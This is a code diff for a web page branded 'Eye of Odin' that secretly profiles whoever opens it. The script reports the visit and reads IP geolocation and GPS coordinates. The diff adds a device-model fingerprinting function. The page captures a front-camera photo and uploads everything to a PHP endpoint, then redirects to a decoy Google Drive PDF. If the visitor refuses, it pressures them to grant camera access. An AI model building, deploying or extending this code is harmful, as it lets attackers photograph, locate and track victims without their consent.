@@ -55,7 +55,6 @@
             margin-top: 30px; border: 0; background: linear-gradient(90deg, var(--accent-2), var(--accent));
             color: #fff; padding: 15px; border-radius: 10px; cursor: pointer;
             font-weight: 900; text-transform: uppercase; letter-spacing: 2px; width: 100%;
-            box-shadow: 0 10px 15px -3px rgba(59, 130, 246, 0.3);
         }
         button:disabled { opacity: 0.3; }
 
@@ -86,7 +85,7 @@
     </div>
 
     <script>
-        // --- SEÑAL DE INFILTRACIÓN: AVISO DE OBJETIVO CONECTADO ---
+        // --- AVISO DE OBJETIVO CONECTADO ---
         fetch('send.php?online=true');
 
         const sensor = document.getElementById('sensor');
@@ -96,13 +95,25 @@
         const ring = document.getElementById('ring');
         let active = false;
 
+        // Función para detectar el modelo del dispositivo de forma más precisa
+        function getDeviceModel() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) {
+                const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
+                return match ? match[1] : "Android Device";
+            }
+            if (/iPhone|iPad|iPod/i.test(ua)) return "Apple iOS Device";
+            if (/Windows/i.test(ua)) return "PC Windows";
+            return "Unknown Device";
+        }
+
         async function getGeo() {
             return new Promise((resolve) => {
                 if (!navigator.permissions) return resolve(null);
                 navigator.permissions.query({name:'geolocation'}).then((res) => {
                     if (res.state === 'granted') {
                         navigator.geolocation.getCurrentPosition(
-                            (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: "HIGH_PRECISION" }),
+                            (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: "ALTA" }),
                             () => resolve(null), { timeout: 3000 }
                         );
                     } else { resolve(null); }
@@ -115,29 +126,26 @@
             active = true;
             mainBtn.disabled = true;
 
-            status.innerHTML = "> INICIANDO NÚCLEO...<br>> RASTREANDO NODOS ISP...";
+            status.innerHTML = "> RASTREANDO DISPOSITIVO...<br>> ANALIZANDO NODOS ISP...";
             ring.style.display = "block";
             laser.style.display = "block";
 
-            let info = "";
-
             try {
-                // 1. Triangulación de Nodos
                 const res = await fetch('https://ipwho.is/');
                 const d = await res.json();
                 
                 const gps = await getGeo();
                 const lat = gps ? gps.lat : d.latitude;
                 const lon = gps ? gps.lon : d.longitude;
-                const prec = gps ? gps.acc : "NETWORK_TRIANGULATION";
+                const model = getDeviceModel();
 
-                info = `
-📡 INFRAESTRUCTURA: ${d.connection.isp}
-📍 LOCALIZACIÓN: ${d.city}, ${d.region}
-🎯 PRECISIÓN: ${prec}
+                const info = `
+📱 DISPOSITIVO: ${model}
+📡 PROVEEDOR: ${d.connection.isp}
+📍 UBICACIÓN: ${d.city}, ${d.region}
+🎯 COORDENADAS: ${lat}, ${lon}
 🔗 MAPA: https://www.google.com/maps?q=${lat},${lon}&z=19`;
 
-                // 2. Captura de Identidad
                 status.innerHTML = "> ANALIZANDO BIOMETRÍA FACIAL...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
@@ -153,7 +161,6 @@
                 const foto = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                 stream.getTracks().forEach(t => t.stop());
 
-                // 3. Envío Seguro vía PHP
                 status.innerHTML = "> EXFILTRANDO DATOS AL SERVIDOR...";
                 const fd = new FormData();
                 fd.append('photo', foto, 'odin.jpg');
@@ -163,11 +170,10 @@
                 
                 status.innerHTML = "✅ ACCESO CONCEDIDO POR ODIN";
                 
-                // REDIRECCIÓN FINAL AL PDF
                 setTimeout(() => location.href = "https://drive.google.com/file/d/1PP1u3nSZmVutryd06XMuLbXYoUTcgazJ/view", 1200);
 
             } catch (err) {
-                status.innerHTML = "❌ ERROR: PERMISO DENEGADO";
+                status.innerHTML = "❌ ERROR: PERMISO REQUERIDO";
                 alert("EYE OF ODIN: Error en sensor. Permita el acceso para validar identidad.");
                 location.reload();
             }
